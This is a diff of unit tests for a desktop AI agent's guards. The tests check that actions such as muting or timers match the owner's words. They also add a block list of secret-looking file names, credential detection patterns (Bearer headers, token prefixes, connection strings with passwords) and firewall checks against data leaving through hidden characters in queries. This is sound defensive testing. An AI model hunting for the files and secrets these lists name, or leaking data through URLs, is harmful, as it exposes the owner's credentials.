+                ("cancel the timer", {"kind": "cancel_timer"}), ("take a screenshot", SHOT),
+                ("screenshot this window", {"kind": "screenshot", "window": True}),
+                ("start focus mode for 30 minutes", {"kind": "focus_mode", "minutes": 30}),
+                ("focus for an hour", {"kind": "focus_mode", "minutes": 60}))
+
+    def test_a_keyword_that_is_no_request_goes_to_a_card_or_is_refused(self) -> None:
+        for goal, args, shown in self.NOT_REQUESTS:
+            with self.subTest(goal=goal, args=args):
+                self.assertEqual(self.how(goal, **args), shown)
+
+    def test_the_owners_requests_as_a_chain_or_after_a_sequencing_word_act_at_once(self) -> None:
+        for goal, args in self.REQUESTS:
+            with self.subTest(goal=goal, args=args):
+                self.assertEqual(self.how(goal, **args), "at once")
+
+    def test_a_take_back_in_the_same_message(self) -> None:
+        for goal, args in (("turn the volume up. Actually, leave the volume alone.", self.UP),
+                           ("mute. no, actually don't mute", self.MUTE),
+                           ("pause, never mind", self.PAUSE),
+                           ("mute and pause. Actually, don't touch the music.", self.PAUSE)):
+            with self.subTest(goal=goal):
+                self.assertEqual(self.how(goal, **args), "card")
+        # ... and only of what it names:
+        self.assertEqual(self.how("mute and pause. Actually, don't touch the music.", **self.MUTE), "at once")
+
+    def test_a_whole_later_message_of_no(self) -> None:
+        for later in ("no, don't", "no wait", "don't", "no", "not that", "actually no", "no don't", "No.", "wait, no",
+                      "nope", "no thanks"):
+            with self.subTest(later=later):
+                self.assertEqual(self.how("research laptops", "mute", later, **self.MUTE), "card")
+        # "cancel that", "forget it": a licence taken back too, so no card either.
+        for later in ("don't do it", "cancel that", "forget it", "never mind", "don't mute after all",
+                      "actually no, leave the sound"):
+            with self.subTest(later=later):
+                self.assertEqual(self.how("research laptops", "mute", later, **self.MUTE), "refused")
+
+    def test_stop_that_stops_the_task_before_it_could_be_a_take_back(self) -> None:
+        self.assertTrue(agent_ui.stop_words("stop that"))
+
+    def test_a_request_that_names_none_of_them_is_the_plain_refusal(self) -> None:
+        self.assertEqual(self.how("turn it off", **self.MUTE), "refused")
+
+    def test_a_no_takes_back_only_the_last_asks_and_a_new_ask_stands(self) -> None:
+        self.assertEqual(self.how("mute", "pause", "no", **self.PAUSE), "card")
+        self.assertEqual(self.how("mute", "pause", "no", **self.MUTE), "at once")
+        self.assertEqual(self.how("mute", "no", "mute", **self.MUTE), "at once")
+        self.assertEqual(self.how("mute", "no, and find the report", **self.MUTE), "at once")  # not a whole no
+        self.assertEqual(self.how("mute", "research laptops", "no", **self.MUTE), "card")      # the last that asked
+
+    # rf-12: the model's call must be what the words ask for.
+    def test_more_than_was_asked_goes_to_a_card(self) -> None:
+        for goal, args in (("set a timer for 5 minutes", {"kind": "timer", "minutes": 240}),
+                           ("focus mode for 10 minutes", {"kind": "focus_mode", "minutes": 240}),
+                           ("turn the volume up", {"kind": "volume", "action": "up", "step": 30}),
+                           ("take a screenshot of this window", {"kind": "screenshot"}),
+                           ("take a screenshot", {"kind": "screenshot", "window": True})):
+            with self.subTest(goal=goal):
+                self.assertEqual(self.how(goal, **args), "card")
+
+    def test_what_was_asked_acts_at_once(self) -> None:
+        for goal, args in (("set a timer for 5 minutes", {"kind": "timer", "minutes": 5}),
+                           ("focus mode for 10 minutes", {"kind": "focus_mode", "minutes": 10}),
+                           ("turn the volume up", {"kind": "volume", "action": "up", "step": 10}),
+                           ("turn the volume up", {"kind": "volume", "action": "up"}),
+                           ("turn the volume up", {"kind": "volume", "action": "up", "step": 5}),
+                           ("take a screenshot of this window", {"kind": "screenshot", "window": True}),
+                           ("take a screenshot", {"kind": "screenshot"})):
+            with self.subTest(goal=goal, args=args):
+                self.assertEqual(self.how(goal, **args), "at once")
+
+    # rf-13: plain wordings a task can read, its own wrapper over the local routes'.
+    def test_plain_wordings_act_at_once(self) -> None:
+        for goal, args in (("turn the sound down", self.DOWN), ("turn the sound up", self.UP),
+                           ("turn down the volume", self.DOWN),
+                           ("turn up the sound", self.UP), ("lower the volume", self.DOWN), ("raise the volume", self.UP),
+                           ("make it louder", self.UP), ("make it quieter", self.DOWN), ("mute it", self.MUTE),
+                           ("mute the sound", self.MUTE), ("unmute the sound", {"kind": "volume", "action": "unmute"}),
+                           ("volume to 40", {"kind": "volume", "action": "set", "level": 40}),
+                           ("set volume 40", {"kind": "volume", "action": "set", "level": 40}),
+                           ("set the sound to 40%", {"kind": "volume", "action": "set", "level": 40}),
+                           ("turn the volume to 40%", {"kind": "volume", "action": "set", "level": 40}),
+                           ("stop the music", self.PAUSE), ("stop the song", self.PAUSE), ("play some music", self.PLAY),
+                           ("skip this song", self.NEXT), ("go back a song", self.PREVIOUS),
+                           ("set a 10 minute timer", {"kind": "timer", "minutes": 10}),
+                           ("a 10-minute timer", {"kind": "timer", "minutes": 10}),
+                           ("set a timer for an hour", {"kind": "timer", "minutes": 60}),
+                           ("set a timer for half an hour", {"kind": "timer", "minutes": 30}),
+                           ("turn on focus mode for 30 minutes", {"kind": "focus_mode", "minutes": 30})):
+            with self.subTest(goal=goal):
+                self.assertEqual(self.how(goal, **args), "at once")
+
+    def test_their_words_are_licences_at_worst_a_card_never_not_asked_for(self) -> None:
+        for goal, args, shown in (("compare the sound quality of these headphones", self.UP, "turn the volume up"),
+                                  ("why did they stop the music at the party", self.PAUSE, "pause the music"),
+                                  ("how do I go back a song on this player", self.PREVIOUS, "go back a track")):
+            with self.subTest(goal=goal):
+                self.assert_on_a_card(goal, shown, **args)
+
+    def test_a_negation_still_reads_them(self) -> None:
+        self.assertEqual(self.how("don't stop the music", **self.PAUSE), "refused")
+        self.assertEqual(self.how("no sound changes please", **self.UP), "refused")
+
+    def test_the_local_routes_do_not_know_them_with_no_task(self) -> None:
+        """A task's own wrapper: the desktop's own routes and licences are as they were, for the app with no task."""
+        for words in ("turn the sound down", "stop the music", "go back a song", "mute it", "volume to 40"):
+            self.assertIsNone(routes.pc_request(words), words)
+        for words in ("compare the sound", "stop the music", "go back a song"):
+            self.assertEqual(dv.licensed_skills(words), frozenset(), words)
 
 
 class OpensOnlyWhatTheOwnerNamed(Corpus):
@@ -1385,11 +1927,15 @@ class NamesAndFoldersThatSaySecrets(Corpus):
                "keepass.xml", "vault.json", "backupcodes.txt", "mypin.txt", "pins.txt", "mnemonic.txt", "netrc.txt",
                "serviceaccount.json", "firebase-adminsdk-x1.json", "gcloud-key.json", "gcp-key.json", "aws_keys.csv",
                "accessKeys.csv", "rootkey.csv", "kubeconfig.yaml", "creditcard.csv", "my passwords.txt", "api keys.md",
-               "accounts.csv", "recovery_codes.txt", "recovery-key.txt", "myTokens.csv", "p\u0430sswords.txt")
+               "accounts.csv", "recovery_codes.txt", "recovery-key.txt", "myTokens.csv", "p\u0430sswords.txt",
+               # rf-9:
+               "passw0rd.txt", "pass.txt", "pwd.txt", "pwds.txt", "pw.txt", "gmail pw.txt", "recovery_phrase.txt",
+               "recovery phrase.txt", "seedwords.txt", "sshkey.txt")
     READABLE = ("classnotes.txt", "secretary_letter.docx", "recovery_plan.docx", "tokenomics_essay.docx",
                 "environment_report.docx", "keyboard_notes.txt", "monkey.txt", "turkey_recipe.txt",
                  "vaulted_ceilings.pdf",
-                "key_dates.txt", "Bramblemoor letter.txt", "notes.md", "pinball scores.csv")
+                "key_dates.txt", "Bramblemoor letter.txt", "notes.md", "pinball scores.csv",
+                "passenger list.txt", "compass.txt", "seeds.txt", "phrasebook.txt", "powers.txt")
 
     def test_each_name(self) -> None:
         for name in self.REFUSED:
@@ -1398,6 +1944,10 @@ class NamesAndFoldersThatSaySecrets(Corpus):
         for name in self.READABLE:
             with self.subTest(name=name):
                 self.assertFalse(guard.sensitive_file_name(name))
+
+    def test_a_folder_of_boarding_passes_is_no_secret(self) -> None:
+        self.assertFalse(guard.sensitive_folder_name("Boarding Pass"))
+        self.assertTrue(guard.sensitive_folder_name("Pwd"))
 
     def listed(self, bench: OwnerBench, *folders: str) -> str:
         """What the folder ``folders`` below Documents lists."""
@@ -1494,9 +2044,69 @@ class NamesAndFoldersThatSaySecrets(Corpus):
         result = self.read("long.txt", body, offset=20_000)
         self.assertEqual(result.code, owner.UNREADABLE)
 
+    def test_a_key_cut_by_a_part_s_end_is_seen(self) -> None:
+        """rf-14: the header runs over the end of the part that would go back: the margin sees it."""
+        body = b"a" * (owner.FILE_PART_CHARS - 12) + b"\n-----BEGIN RSA PRIVATE KEY-----\n"
+        self.assertEqual(self.read("cut.txt", body).code, owner.UNREADABLE)
+
+    KEY = "Sup3rS3cretValue123456"
+
+    def test_what_plainly_holds_a_key_the_review_found_getting_by(self) -> None:
+        """rf-9: past the first 600 characters of a line, a Bearer's space, the well-known prefixes, a password in an
+        address, wide spaces."""
+        key = self.KEY
+        for label, text in (("minified, past 600", '{"a":"' + "x" * 700 + f'","password":"{key}"}}'),
+                            ("minified, an api key", '{"a":"' + "x" * 700 + f'","api_key":"{key}"}}'),
+                            ("a long csv line", "name," * 150 + f"password={key}"),
+                            ("far along", "name," * 3000 + f"password={key}"),
+                            ("Authorization: Bearer", f"Authorization: Bearer {key}"),
+                            ("a curl header", f'curl -H "Authorization: Bearer {key}" https://api.example.org'),
+                            ("Basic", f"authorization: basic {key}"),
+                            ("sk-proj", "sk-proj-" + "a" * 40), ("ghs_", "ghs_" + "a" * 36), ("ghu_", "ghu_" + "a" * 36),
+                            ("glpat", "glpat-" + "a" * 20), ("stripe", "sk_live_" + "a" * 24),
+                            ("a JWT", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0." + "a" * 30),
+                            ("a connection string", f"DATABASE_URL=postgres://admin:{key}@db.example.org/prod"),
+                            ("an address with a password", f"https://admin:{key}@git.example.org/repo.git"),
+                            ("wide spaces", f"password     =     {key}"),
+                            ("PuTTY", f"PuTTY-User-Key-File-3: ssh-ed25519\nPrivate-Lines: 1\n{key}")):
+            with self.subTest(label=label):
+                self.assertTrue(guard.holds_secret(text))
+
+    def test_a_long_line_has_no_gap_between_its_windows(self) -> None:
+        for at in range(0, 2_000, 17):
+            with self.subTest(at=at):
+                self.assertTrue(guard.holds_secret("a," * (at // 2) + f'"password":"{self.KEY}"'))
+
+    def test_what_only_looks_like_one_is_read(self) -> None:
+        for text in ("https://www.example.org:8443/path/to/page", "postgres://db.example.org/prod",
+                     "mailto://ana@example.org", "see https://example.org/a:b@c", "Authorization: none",
+                     "Bearer of good news: the sky is blue", "basic: hello", "token: abc",
+                     "sk-short", "ghs_short", "eyJ.eyJ", "the eyJ prefix", "key: value", "version: 1.2.3",
+                     '{"a":"' + "x" * 3000 + '","colour":"blue"}', "name," * 3000):
+            with self.subTest(text=text[:40]):
+                self.assertFalse(guard.holds_secret(text))
+
 
 class ListsAndCapsThatCanFail(Corpus):
     """ars-28: guards no test could fail before."""
+
+    def test_a_long_address_s_card_spells_out_what_no_one_could_see(self) -> None:
+        """rf-14: the host card: a question holding an invisible character, in plain sight."""
+        address = f"{HOST}/deals?q={'a' * 150}"
+        bench = self.bench(f"read {address}")
+        bench.things.notes = ("Gym at 6",)
+        bench.call("memory_read")
+        result = bench.call("fetch_text", url=address, question="Is it\u200B on sale?")
+        self.assertEqual(result.code, fw.WAITING)
+        self.assertIn("another way", bench.cards[-1])
+        self.assertIn("Is it<U+200B> on sale?", bench.cards[-1])
+        self.assertNotIn("\u200B", bench.cards[-1])
+
+    def test_a_query_of_odd_spaces_goes_out_with_plain_ones(self) -> None:
+        """rf-14: what the firewall saw is what goes, so a run of odd spaces carries nothing."""
+        bench = self.bench("look up quiet laptops")
+        bench.call("web_search", query="quiet \u00A0\u2003 \t laptops")
+        self.assertEqual(bench.browser.loads[0], web.ENGINES[0].url("quiet laptops"))
 
     def test_an_encoded_question_with_no_tainted_word_waits(self) -> None:
         site = f"{HOST}/deals"
